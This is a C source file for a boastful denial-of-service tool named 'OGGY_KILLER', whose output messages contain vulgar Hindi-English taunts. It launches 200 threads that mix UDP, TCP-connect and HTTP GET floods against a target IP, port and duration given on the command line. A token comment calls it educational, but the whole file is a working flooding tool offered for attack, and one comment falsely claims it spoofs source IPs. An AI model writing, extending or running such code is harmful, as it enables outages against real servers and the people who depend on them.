#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <time.h>
#include <signal.h>

#define MAX_THREADS 200
#define PAYLOAD_SIZE 1024

int running = 1;
char *target_ip;
int target_port;
int attack_time;

// Function to handle Ctrl+C
void signal_handler(int sig) {
    running = 0;
    printf("\n[!] Attack stopped by user. OGGY says: CHUMT KA GULAM bach gaya! 😂\n");
    exit(0);
}

// UDP flood function with random spoofed IPs (for educational/authorized testing only)
void *udp_flood(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    char packet[PAYLOAD_SIZE];
    time_t start_time = time(NULL);

    // Create UDP socket
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    // Randomize payload
    for (int i = 0; i < PAYLOAD_SIZE; i++) {
        packet[i] = rand() % 255;
    }

    while (running) {
        // Send UDP packet with random source port
        server_addr.sin_port = htons(rand() % 65535);
        if (sendto(sock, packet, PAYLOAD_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            // Silent fail - keep hammering
        }
    }

    close(sock);
    pthread_exit(NULL);
}

// TCP SYN flood (raw socket required; alternative using connect)
void *tcp_flood(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    time_t start_time = time(NULL);

    while (running) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(target_port);
        inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

        // Connect attempt - SYN packet sent
        connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
        close(sock);
        usleep(100); // Small delay to keep CPU balanced
    }

    pthread_exit(NULL);
}

// HTTP GET flood (application layer)
void *http_flood(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    char http_request[512];

    while (running) {
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;

        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(80); // HTTP port
        inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

        if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) == 0) {
            snprintf(http_request, sizeof(http_request),
                     "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: OGGY_KILLER/1.0\r\n\r\n",
                     target_ip);
            send(sock, http_request, strlen(http_request), 0);
        }
        close(sock);
        usleep(50);
    }

    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("\n🔥 OGGY_KILLER - System Destroyer 🔥\n");
        printf("Usage: ./oggy <IP> <PORT> <TIME>\n");
        printf("Example: ./oggy 192.168.1.1 80 60\n");
        printf("\nCHUMT KE PYASA, sahi command daal! 😈\n");
        return 1;
    }

    // Parse arguments
    target_ip = argv[1];
    target_port = atoi(argv[2]);
    attack_time = atoi(argv[3]);

    if (target_port < 1 || target_port > 65535) {
        printf("Invalid port, CHUMT KA GULAM! 1-65535 daal.\n");
        return 1;
    }

    if (attack_time < 1) {
        printf("Time sekund mein daal, 1 se kam nahi! 😾\n");
        return 1;
    }

    printf("\n========================================\n");
    printf("  OGGY_KILLER ACTIVATED 😈🔥\n");
    printf("  Target: %s:%d\n", target_ip, target_port);
    printf("  Duration: %d seconds\n", attack_time);
    printf("  Threads: %d (UDP + TCP + HTTP mix)\n", MAX_THREADS);
    printf("========================================\n");
    printf("[!] CHUMT KA DARINDA aa gaya! System ki maa chodne! 💀\n\n");

    signal(SIGINT, signal_handler);

    pthread_t threads[MAX_THREADS];
    srand(time(NULL));

    // Launch mixed attack threads
    for (int i = 0; i < MAX_THREADS; i++) {
        if (i % 3 == 0) {
            pthread_create(&threads[i], NULL, udp_flood, NULL);
        } else if (i % 3 == 1) {
            pthread_create(&threads[i], NULL, tcp_flood, NULL);
        } else {
            pthread_create(&threads[i], NULL, http_flood, NULL);
        }
    }

    printf("[✔] All %d threads launched. Let the chaos begin! 💥\n", MAX_THREADS);

    // Countdown timer
    for (int t = attack_time; t > 0 && running; t--) {
        printf("\r[⏳] Time remaining: %03d seconds   ", t);
        fflush(stdout);
        sleep(1);
    }

    running = 0;
    printf("\n\n[!] Attack complete. OGGY says: CHUMT KA GULAM, system gaya tel lene! 😈🥀\n");
    printf("[!] Target server should be crying right now. 😂\n");

    // Wait for threads to finish
    for (int i = 0; i < MAX_THREADS; i++) {
        pthread_cancel(threads[i]);
        pthread_join(threads[i], NULL);
    }

    printf("\n[✔] Cleanup done. OGGY_KILLER signing off! 🙌🏻🔥\n");
    return 0;
}
